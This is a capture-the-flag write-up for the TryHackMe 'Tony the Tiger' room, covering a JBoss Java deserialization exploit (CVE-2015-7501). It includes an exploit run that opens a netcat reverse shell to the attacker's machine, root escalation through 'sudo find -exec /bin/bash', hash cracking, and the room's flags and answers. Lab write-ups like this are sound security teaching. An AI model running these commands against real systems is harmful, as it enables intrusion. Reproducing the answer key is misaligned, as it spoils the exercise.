# Tony the Tiger

Learn how to use a Java Serialisation attack in this boot-to-root

[Tony the Tiger](https://tryhackme.com/room/tonythetiger)

## Topic's

- Network Enumeration
- Web Poking
- CVE-2015-7501 - Jboss Java Deserialization
- Stored Passwords & Keys
- Misconfigured Binaries
- Brute Forcing (Hash)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy!

Firstly, ensure you are connected to the TryHackMe network via either the VPN Service or [Kali Instance](https://tryhackme.com/room/kali) (subscribed members only). If you are not using the [Kali Instance](https://tryhackme.com/room/kali), you can [verify connectivity to the THM network on the "access" page](https://tryhackme.com/access). Or if you are new, you can learn how to connect by [visiting the OpenVPN Room](https://tryhackme.com/room/openvpn).

**Please allow up towards five minutes for this instance to fully boot - even as a subscribed member.** This is not a TryHackMe or AWS bottleneck, rather Java being Java and the web application taking time to fully initialise after boot.

**Your Instance IP Address: MACHINE_IP**

Deploying now and proceeding with the material below should allow for plenty of time for the instance to fully boot.

1. I have deployed my Instance!

## Task 2 Support Material

Whilst this is a CTF-style room, as the approach to ultimately "rooting" the box is new to TryHackMe, I will explain it a little and leave you to experiment with. There are flags laying around that aren't focused on the CVE, so I still encourage exploring this room. Explaining the whole-theory behind it is a little out of scope for this. However, I have provided some further reading material that may help with the room - or prove interesting!

**What is "Serialisation"?**

Serialisation at an abstract is the process of converting data - specifically "Objects" in Object-Oriented Programming (OOP) languages such as Java into lower-level formatting known as "byte streams", where it can be stored for later use such as within files, databases, and/or traversed across a network. It is then later converted from this "byte stream" back into the higher-level "Object". This final conversion is known as "De-serialisation"

![](https://media.geeksforgeeks.org/wp-content/uploads/serialization-5.jpg)

(kindly taken from [https://www.geeksforgeeks.org/classes-objects-java/](https://www.geeksforgeeks.org/classes-objects-java/))

**So what is an "Object"?**

"Objects" in a programming-context can be compared to real-life examples. Simply, an "Object" is just that - a thing. "Objects" can contain various types of information such as states or features. To correlate to a real-world example...Let's take a lamp.

A lamp is a great "Object". a lamp can be on or off, the lamp can have different types of bulbs - but ultimately it is still a lamp. What type of bulb it uses and whether or not the lamp is "on" or "off" in this instance is all stored within an "Object".

**How can we exploit this process?**

A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage. When this data is later accessed by the application, malicious code can result in serious implications...ranging from DoS, data leaking or much more nefarious attacks like being "rooted"! Can you see where this is going...?

1. What is a great IRL example of an "Object"?

`lamp`

2. What is the acronym of a possible type of attack resulting from a "serialisation" attack?

`DoS`

3. What lower-level format does data within "Objects" get converted into?

`byte stream`

## Task 3 Reconnaissance

Your first reaction to being presented with an instance should be information gathering.

```
kali@kali:~/CTFs/tryhackme/Tony the Tiger$ sudo nmap -A -sS -sC -sV -O 10.10.179.44
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 15:04 CEST
Nmap scan report for 10.10.179.44
Host is up (0.036s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Hugo 0.66.0
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Tony&#39;s Blog
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings:
|   NULL:
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
4446/tcp open  java-object Java Object Serialization
5500/tcp open  hotline?
| fingerprint-strings:
|   DNSStatusRequestTCP, RPCCheck:
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     GSSAPI
|     thm-java-deserial
|   DNSVersionBindReqTCP:
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   GenericLines, NULL:
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   GetRequest:
|     NTLM
|     GSSAPI
|     DIGEST-MD5
|     CRAM-MD5
|     thm-java-deserial
|   HTTPOptions:
|     CRAM-MD5
|     NTLM
|     GSSAPI
|     DIGEST-MD5
|     thm-java-deserial
|   Help:
|     GSSAPI
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   Kerberos:
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   RTSPRequest:
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     DIGEST-MD5
|     thm-java-deserial
|   SSLSessionReq:
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   TLSSessionReq:
|     CRAM-MD5
|     NTLM
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   TerminalServerCookie:
|     DIGEST-MD5
|     GSSAPI
|     CRAM-MD5
|     NTLM
|_    thm-java-deserial
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods:
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss AS
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.80%I=7%D=10/14%Time=5F86F773%P=x86_64-pc-linux-gnu%r(N
SF:ULL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x9
SF:7\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objBy
SF:tesq\0~\0\x01xp\xcb\x07\x93Hur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x0
SF:2\0\0xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q
SF:\0~\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.ser
SF:ver\.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.serv
SF:er\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.s
SF:erver\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2
SF:\0\0\x16thm-java-deserial\.home\0\0\x04J\xf0\x99\x9e\[\x04}B\x8c\nAu\)\
SF:0\0\x01u'2\x80w\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.80%I=7%D=10/14%Time=5F86F779%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.80%I=7%D=10/14%Time=5F86F779%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NT
SF:LM\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deseri
SF:al")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0
SF:\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x1
SF:1thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x
SF:03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x08C
SF:RAM-MD5\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\
SF:x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTLM\x01\x06
SF:GSSAPI\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\
SF:0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\
SF:x06GSSAPI\x01\x04NTLM\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RPCC
SF:heck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08C
SF:RAM-MD5\x01\nDIGEST-MD5\x01\x04NTLM\x01\x06GSSAPI\x02\x11thm-java-deser
SF:ial")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NT
SF:LM\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01
SF:\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\
SF:x01\x04NTLM\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G
SF:\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\x04NTL
SF:M\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(SSLSessi
SF:onReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDI
SF:GEST-MD5\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-dese
SF:rial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x
SF:03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\x04N
SF:TLM\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x0
SF:3\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTLM\x01\nDIGE
SF:ST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-M
SF:D5\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=31900%PV=Y%DS=2%DC=T%G=Y%TM=5F86F7
OS:92%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   34.63 ms 10.8.0.1
2   35.54 ms 10.10.179.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.33 seconds
```

1. What service is running on port "8080"

```
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss AS
```

`Apache Tomcat/Coyote JSP engine 1.1`

2. What is the name of the front-end application running on "8080"?

`JBoss`

## Task 4 Find Tony's Flag!

Tony has started a totally unbiased blog about taste-testing various cereals! He'd love for you to have a read...

1. This flag will have the formatting of "THM{}"

[http://10.10.179.44/posts/frosted-flakes/](http://10.10.179.44/posts/frosted-flakes/)

```
kali@kali:~/CTFs/tryhackme/Tony the Tiger$ curl -s http://10.10.179.44/posts/frosted-flakes/ | grep img
  <link rel='icon' type='image/x-icon' href="https://i.imgur.com/ATbbYpN.jpg" />
<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>
    <img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />
kali@kali:~/CTFs/tryhackme/Tony the Tiger$ wget https://i.imgur.com/be2sOV9.jpg
--2020-10-14 15:10:23--  https://i.imgur.com/be2sOV9.jpg
Resolving i.imgur.com (i.imgur.com)... 151.101.112.193
Connecting to i.imgur.com (i.imgur.com)|151.101.112.193|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84746 (83K) [image/jpeg]
Saving to: ‘be2sOV9.jpg’

be2sOV9.jpg                                      100%[=======================================================================================================>]  82.76K   286KB/s    in 0.3s

2020-10-14 15:10:24 (286 KB/s) - ‘be2sOV9.jpg’ saved [84746/84746]

kali@kali:~/CTFs/tryhackme/Tony the Tiger$ strings be2sOV9.jpg | grep THM
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
```

`THM{Tony_Sure_Loves_Frosted_Flakes}`

## Task 5 Exploit!

Download the attached resources (48.3MB~) to this task by pressing the "Download" icon within this task.

FILE NAME: **jboss.zip (48.3MB~)** MD5 CHECKSUM: **ED2B009552080A4E0615451DB0769F8B**

The attached resources are compiled together to ensure that everyone is able to complete the exploit, **these resources are not my own creations** (although have been very slightly modified for compatibility) **and all credit is retained to the respective authors listed within "credits.txt"** as well as the end of the room.

![](https://i.imgur.com/a1yznLT.png)

It is your task to research the vulnerability [CVE-2015-7501](https://www.rapid7.com/db/vulnerabilities/http-jboss-cve-2015-7501) and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it...If you are struggling, I[ have written an example of how this vulnerability is used to launch an application on Windows](https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/).

There's also a couple of ways of exploiting this service - I really encourage you to investigate into them yourself!

1. I have obtained a shell.

```
kali@kali:~/CTFs/tryhackme/Tony the Tiger/jboss$ python exploit.py 10.10.179.44:8080 "nc -e /bin/bash 10.8.106.222 9001"
[*] Target IP: 10.10.179.44
[*] Target PORT: 8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Command executed successfully
```

## Task 6 Find User JBoss' flag!

Knowledge of the Linux (specifically Ubuntu/Debian)'s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the fantastic [TryHackMe ZTHLinux Room](http://tryhackme.com/room/zthlinux) by [lollava](http://tryhackme.com/p/lollava).

1. This flag has the formatting of "THM{}"

```
pwd
/
cd /home
grep -R "THM{" * 2>/dev/null
jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
```

`THM{50c10ad46b5793704601ecdad865eb06}`

## Task 7 Escalation!

Normal boot-to-root expectations apply here! It is located in /root/root.txt. Get cracking :)

1. The final flag does not have the formatting of "THM{}"

```
cd jboss
pwd
/home/jboss
ls
note
cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
```

```
kali@kali:~/CTFs/tryhackme/Tony the Tiger/jboss$ ssh jboss@10.10.179.44
The authenticity of host '10.10.179.44 (10.10.179.44)' can't be established.
ECDSA key fingerprint is SHA256:4QLWqzX1KRYhF9PwQBGqNaH5mOk6uuV8QwfHDP7Wgqk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.179.44' (ECDSA) to the list of known hosts.
jboss@10.10.179.44's password:
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
jboss@thm-java-deserial:~$ pwd
/home/jboss
jboss@thm-java-deserial:~$ ls
note
jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
jboss@thm-java-deserial:~$ sudo find . -exec /bin/bash \; -quit
root@thm-java-deserial:~# cd /root
root@thm-java-deserial:/root# ls
root.txt
root@thm-java-deserial:/root# cat root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
root@thm-java-deserial:/root# cat root.txt | base64 -d
BC77AC072EE30E3760806864E234C7CF
```

```
kali@kali:~/CTFs/tryhackme/Tony the Tiger$ hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: bc77ac072ee30e3760806864e234c7cf
Time.Started.....: Wed Oct 14 15:22:34 2020 (1 sec)
Time.Estimated...: Wed Oct 14 15:22:35 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   463.6 kH/s (0.55ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 231424/14344385 (1.61%)
Rejected.........: 0/231424 (0.00%)
Restore.Point....: 229376/14344385 (1.60%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 170176 -> youngc1

Started: Wed Oct 14 15:22:28 2020
Stopped: Wed Oct 14 15:22:35 2020
```

`zxcvbnm123456789`

## Task 8 Final Remarks, Credits & Further Reading

Final Remarks

I hope this was a refreshing CTF, where classic techniques meet new content on THM - all of which are not based around Metasploit!

This type of attack can prove to be extremely dangerous - as you'd hopefully have discovered by now. It's still very real as sigh, java web applications are still used day-to-day. Because of their nature, "Serialisation" attacks all execute server-side, and as such - it results in being very hard to prevent from Firewalls / IDS' / IPS'.

For any and all feedback, questions, problems or future ideas you'd like to be covered, please get in touch in the TryHackMe Discord (following Rule #1)

So long and thanks for all the fish!

~CMNatic

Credits

Again, to reiterate, the provided downloadable material has only slightly been adapted to ensure compatibility for all users across TryHackMe. Generating and executing the payload especially is very user-environment dependant (i.e. Java versions, of which are hard to manage on Linux, etc...)

Many thanks to byt3bl33d3r for providing a reliable Proof of Concept, and finally to all the contributors towards Frohoff's Ysoserial which facilitates the payload generation used for this CVE.

Further Reading

If you are curious into the whole "Serialisation" and "De-Serialisation" process and how it can be exploited, I recommend the following resources:

- https://www.baeldung.com/java-serialization
- http://frohoff.github.io/appseccali-marshalling-pickles/
- https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
- https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237
